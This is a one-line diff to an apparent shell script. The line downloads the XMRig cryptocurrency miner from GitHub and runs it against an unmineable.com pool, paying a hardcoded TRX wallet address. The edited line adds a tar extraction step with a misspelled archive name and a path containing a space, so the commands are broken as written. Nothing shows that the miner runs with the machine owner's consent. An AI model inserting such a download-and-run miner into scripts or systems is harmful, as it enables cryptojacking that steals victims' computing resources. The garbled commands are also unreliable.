@@ -1,1 +1,1 @@
-wget https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-static-x64.tar.gz && cd xmrig 6.21.3 && ./xmrig -o rx.unmineable.com:3333 -k -u TRX:TK6ZLhGR4cBDwgb3VEJ2C5tbM3D3Rm5UUN.Cornertech -p x
+wget https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-static-x64.tar.gz && tar -xvf xmrig 6.21.3linix-static-x64.tar.gz && cd xmrig 6.21.3 && ./xmrig -o rx.unmineable.com:3333 -k -u TRX:TK6ZLhGR4cBDwgb3VEJ2C5tbM3D3Rm5UUN.Cornertech -p x
